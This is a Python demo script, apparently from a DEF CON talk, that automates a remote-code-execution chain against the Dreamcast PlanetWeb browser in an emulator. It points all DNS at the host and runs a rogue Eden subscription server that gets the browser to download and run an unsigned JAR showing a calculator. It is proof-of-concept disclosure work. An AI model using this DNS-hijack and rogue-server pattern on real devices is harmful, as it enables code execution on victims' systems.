#!/usr/bin/env python3
"""
dreamcast_calc.py -- one-command DEF CON demo #2:
    Dreamcast PlanetWeb browser  ->  Eden service-subscription RCE  ->  a calculator.

    sudo python3 dreamcast_calc.py

The SIMPLE demo. No memory corruption, no stack overflow, no GDB staging, no email --
just Bug #1, the design flaw: the browser phones home to eden.planetweb.com (dead since
2001), we answer, and it downloads + runs our unsigned JAR with no SecurityManager. The
JAR renders a working AWT calculator on the console -- unmistakable arbitrary code
execution. The chain fires on its own the moment the browser goes online.

Fully independent of dreamcast_doom.py (the overflow/DOOM demo): different bug, different
payload, no shared trigger. Run one or the other, not both at once.

You do two things by hand: take the browser online, and (once) have the browser reach us.
Everything else -- DNS, the rogue Eden server, launching + relaunching the emulator through
its boot race -- is automatic.

Requires root (binds :53, :80). Build the payload first:  ./build_calc.sh
"""

import os, sys, time, socket, struct, subprocess, threading, signal

ROOT     = os.path.dirname(os.path.abspath(__file__))
FLYCAST  = os.path.join(ROOT, "src-build/flycast-src/build/Flycast.app/Contents/MacOS/Flycast")
FCHOME   = os.path.join(ROOT, "emu/fchome")
FCLOG    = os.path.join(FCHOME, ".flycast/data/flycast.log")
FCDATA   = os.path.join(FCHOME, ".flycast/data")
# a pristine, already-configured flash+VMU shared by BOTH demos, restored before every
# launch so no state (Eden subscription, cached pages, cookies, last URL) leaks between
# runs -- calc after doom, or doom after calc, each starts identical and fresh.
BASELINE = os.path.join(ROOT, "emu", "flash_baseline")
PERSIST  = ("dc_nvmem.bin", "dc_flash.bin", "T31901N_vmu_save_A1.bin", "vmu_save_A2.bin")
DNS_PY   = os.path.join(ROOT, "dns_redirect.py")
EDEN_PY  = os.path.join(ROOT, "eden_mitm.py")
CALC_JAR = os.path.join(ROOT, "build/pwn_calc.jar")
EDEN_LOG = "/tmp/eden_calc.log"
DNS_LOG  = "/tmp/demo_dns.log"
EDEN_PORT = 80
# NOTE: this demo NEVER starts or connects to a GDB stub. The Eden RCE needs no
# debugger, no staging, no memory inspection -- launching one would be pointless and
# risks interfering with the guest. Flycast is launched with the GDB server OFF.

# the browser disc (override with DISC=/path)
DISC = os.environ.get("DISC",
    os.path.expanduser("~/Downloads/Internet Browser V3.0 for Dreamcast (USA)/"
                       "Internet Browser V3.0 for Dreamcast (USA).gdi"))

FLYCAST_ATTEMPTS = 12

G="\033[92m"; Y="\033[93m"; R="\033[91m"; B="\033[1m"; X="\033[0m"
def say(m):  print("   " + m, flush=True)
def hdr(m):  print("\n" + G + "="*66 + "\n== " + m + "\n" + "="*66 + X, flush=True)
def warn(m): print(R + "!! " + m + X, flush=True, file=sys.stderr)

procs = []

def _iface_inet(iface):
    """The IPv4 on an interface, however it was assigned (ipconfig getifaddr only reports
    DHCP leases -- a tethered/static address like 192.0.0.2 needs the ifconfig fallback)."""
    try:
        a = subprocess.check_output(["ipconfig","getifaddr",iface], text=True).strip()
        if a: return a
    except Exception: pass
    try:
        for l in subprocess.check_output(["ifconfig",iface], text=True).splitlines():
            l=l.strip()
            if l.startswith("inet ") and not l.split()[1].startswith("127."):
                return l.split()[1]
    except Exception: pass
    return ""

def host_ip():
    if os.environ.get("HOST_IP"): return os.environ["HOST_IP"]
    # 1) the default-route interface (works for static/tethered/DHCP alike)
    try:
        dev = subprocess.check_output(["route","-n","get","default"], text=True)
        iface = next(l.split()[-1] for l in dev.splitlines() if "interface:" in l)
        a = _iface_inet(iface)
        if a: return a
    except Exception: pass
    # 2) any physical en* address (skip loopback + tailscale/CGNAT 100.64/10)
    try:
        cur=None
        for l in subprocess.check_output(["ifconfig"], text=True).splitlines():
            if l and not l[0].isspace(): cur=l.split(":")[0]
            s=l.strip()
            if s.startswith("inet ") and cur and cur.startswith("en"):
                ip=s.split()[1]
                if not ip.startswith("127.") and not ip.startswith("100."):
                    return ip
    except Exception: pass
    return "127.0.0.1"

def real_user():
    return os.environ.get("SUDO_USER") or subprocess.check_output(
        ["stat","-f%Su","/dev/console"], text=True).strip()

def kill_stale():
    """Reap leftovers from EITHER demo so ports free up and only one demo runs at a time.
    We run as root; protect our own pid/parent/process-group so we never kill ourselves."""
    me=os.getpid(); parent=os.getppid()
    try: my_pgid=os.getpgid(0)
    except Exception: my_pgid=-1
    protected={me,parent,0}
    def reap(pat,label):
        try: out=subprocess.check_output(["pgrep","-f",pat],text=True).split()
        except subprocess.CalledProcessError: out=[]
        for s in out:
            pid=int(s)
            if pid in protected: continue
            try:
                if os.getpgid(pid)==my_pgid: continue
            except Exception: pass
            try: os.kill(pid, signal.SIGTERM); say("reaped stale %s (pid %d)"%(label,pid))
            except Exception: pass
    for n in ("dns_redirect.py","eden_mitm.py","mail_poc.py","dreamcast_calc.py",
              "dreamcast_doom.py","doom_demo_1.py"):
        reap(n,n)
    try:
        for s in subprocess.check_output(["pgrep","-x","Flycast"],text=True).split():
            try: os.kill(int(s),signal.SIGTERM); say("reaped stale Flycast (pid %s)"%s)
            except Exception: pass
    except subprocess.CalledProcessError: pass
    time.sleep(2)

def reset_flash():
    """Restore the pristine, pre-configured flash+VMU so this demo starts exactly like every
    other -- no Eden subscription, cached page, cookie, or last-URL carried over from a prior
    demo. The baseline keeps the network + email config both demos need, so nothing is wiped.
    If no baseline exists yet it captures the current flash as the baseline. RECAPTURE=1 forces
    a fresh capture (do it once, after the browser is configured to a known-good state)."""
    import shutil
    os.makedirs(BASELINE, exist_ok=True)
    present = [f for f in PERSIST if os.path.exists(os.path.join(FCDATA, f))]
    have = present and all(os.path.exists(os.path.join(BASELINE, f)) for f in present)
    if os.environ.get("RECAPTURE") == "1" or not have:
        n = 0
        for f in present:
            shutil.copy2(os.path.join(FCDATA, f), os.path.join(BASELINE, f)); n += 1
        say("captured clean flash/VMU baseline (%d files) -- future runs reset to this" % n)
        return
    n = 0
    for f in present:
        b = os.path.join(BASELINE, f)
        if os.path.exists(b):
            shutil.copy2(b, os.path.join(FCDATA, f)); n += 1
    say("reset to clean browser (%d files) -- no subscription/cache from a prior demo" % n)

def cleanup(*_):
    print()
    for _,p in procs:
        if p.poll() is None:
            try: p.terminate()
            except Exception: pass
    subprocess.run(["pkill","-TERM","-x","Flycast"], stderr=subprocess.DEVNULL)
    say("stopped DNS + Eden + emulator")
    os._exit(0)

# ---- boot (NO GDB -- the debugger halts the guest mid-boot, which is what was pausing it) ----
def launch_flycast(ip):
    """Cold boot with the GDB server OFF. We retry ONLY the vmem-reservation race, which is
    detectable from the log ('Verify Failed') without any debugger. Nothing here ever opens
    or connects to a GDB stub -- attaching one pauses the SH-4 and stalls the boot."""
    user=real_user(); os.makedirs(FCDATA, exist_ok=True)
    for f in (os.listdir(FCDATA) if os.path.isdir(FCDATA) else []):
        if f.endswith(".state"):
            try: os.remove(os.path.join(FCDATA,f))
            except Exception: pass
    reset_flash()   # identical clean browser every launch (see reset_flash docstring)
    subprocess.run(["sudo","-u",user,"defaults","write","com.flyinghead.Flycast",
                    "ApplePersistenceIgnoreState","-bool","YES"],
                   stderr=subprocess.DEVNULL, env=dict(os.environ, HOME=FCHOME))
    args=["sudo","-u",user,"env","HOME="+FCHOME, FLYCAST,
          "-config","log:LogToFile=yes",
          "-config","config:Debug.GDBEnabled=no",     # <- GDB server OFF, always
          "-config","network:Enable=yes",
          "-config","network:DCNet=no",
          "-config","network:EmulateBBA=yes",
          "-config","network:DNS="+ip,
          DISC]
    for att in range(1, FLYCAST_ATTEMPTS+1):
        try: open(FCLOG,"w").close()
        except Exception: pass
        p=subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        ok=None
        for _ in range(30):
            time.sleep(1)
            try: log=open(FCLOG,errors="ignore").read()
            except Exception: log=""
            if "Verify Failed" in log: ok=False; break      # vmem race -> relaunch
            if "Game ID" in log:       ok=True;  break      # booting -> accept, DON'T probe it
            if p.poll() is not None:   ok=False; break
        if ok:
            time.sleep(2)
            if p.poll() is None:
                if att>1: say("(booted on attempt %d)"%att)
                return p
        say("attempt %d: RAM-reservation race, relaunching"%att)
        try: p.terminate()
        except Exception: pass
        subprocess.run(["pkill","-TERM","-x","Flycast"], stderr=subprocess.DEVNULL)
        time.sleep(2)
    warn("Flycast would not start in %d attempts (see %s)"%(FLYCAST_ATTEMPTS,FCLOG)); cleanup()

# ---- watch the Eden chain fire ----
def watch_chain():
    steps = [("[1]","edenclient.conf — the console asks where to log in"),
             ("[2]","POST /login    — we answer as Eden"),
             ("[3]","POST /discovery — we offer a 'service'"),
             ("[4]","POST /subscribe — we hand back a download URL"),
             ("[5]","serving pwn.jar — *** CODE EXECUTION: the console downloads + runs our JAR ***")]
    seen=set()
    while True:
        try: log=open(EDEN_LOG,errors="ignore").read()
        except Exception: log=""
        for tag,desc in steps:
            if tag in log and tag not in seen:
                seen.add(tag)
                col = Y+B if tag=="[5]" else ""
                say(col+tag+" "+desc+X)
                if tag=="[5]":
                    say(G+"    -> CalcService.run() opens the calculator Frame on screen."+X)
                    say("    (a bare GET / is only the portal home resolving to us -- the proof is [1]..[5])")
        time.sleep(1)

def main():
    if os.geteuid()!=0:
        warn("needs root for :53 and :80 -- run:  sudo python3 dreamcast_calc.py"); sys.exit(1)
    for f in (FLYCAST, DISC, DNS_PY, EDEN_PY):
        if not os.path.exists(f): warn("missing required file: %s"%f); sys.exit(1)
    if not os.path.exists(CALC_JAR):
        warn("calculator payload missing: %s"%CALC_JAR); warn("build it first:  ./build_calc.sh"); sys.exit(1)

    signal.signal(signal.SIGINT, cleanup); signal.signal(signal.SIGTERM, cleanup)
    ip=host_ip()

    hdr("DEF CON -- Dreamcast PlanetWeb  ->  Eden RCE (design flaw)  ->  a calculator")
    say("host IP   %s   (guest DNS points here)"%ip)
    say("disc      %s"%os.path.basename(DISC))
    say("payload   build/pwn_calc.jar (AWT calculator, class v45.3)")
    if ip=="127.0.0.1":
        warn("HOST_IP resolved to loopback -- the guest can't reach that. Set HOST_IP=<lan ip>.")

    kill_stale()

    say("[1/3] DNS  : all names -> %s"%ip)
    procs.append(("dns", subprocess.Popen(
        [sys.executable,"-u",DNS_PY, ip, "--all", "--bind="+ip],
        stdout=open("/tmp/demo_dns.log","w"), stderr=subprocess.STDOUT)))
    time.sleep(1)

    say("[2/3] Eden : rogue eden.planetweb.com on :%d   chain=calc"%EDEN_PORT)
    procs.append(("eden", subprocess.Popen(
        [sys.executable,"-u",EDEN_PY, "--chain","calc", "-p",str(EDEN_PORT)],
        stdout=open(EDEN_LOG,"w"), stderr=subprocess.STDOUT)))
    time.sleep(2)
    with open(EDEN_LOG,errors="ignore") as f:
        for ln in list(f)[:8]:
            if "chain=calc" in ln or "service jar" in ln: say("  "+ln.strip())

    say("[3/3] EMU  : launching the Dreamcast (GDB server OFF)")
    launch_flycast(ip)
    say("emulator up")

    hdr("TAKE THE BROWSER ONLINE")
    say(B+"A x3 -> Start -> web browser."+X+"  Let it connect.")
    say("that's the whole trigger -- the Eden client contacts eden.planetweb.com (us) on")
    say("its own, walks the subscription chain, and runs our JAR. Watch the steps below:")
    say("")

    threading.Thread(target=watch_chain, daemon=True).start()

    hdr(Y+B+"WATCHING THE EDEN CHAIN -- the calculator appears at [5]"+X)
    say("no email, no staging, no timing to get right. Ctrl-C here stops everything.")
    signal.pause()

if __name__ == "__main__":
    main()
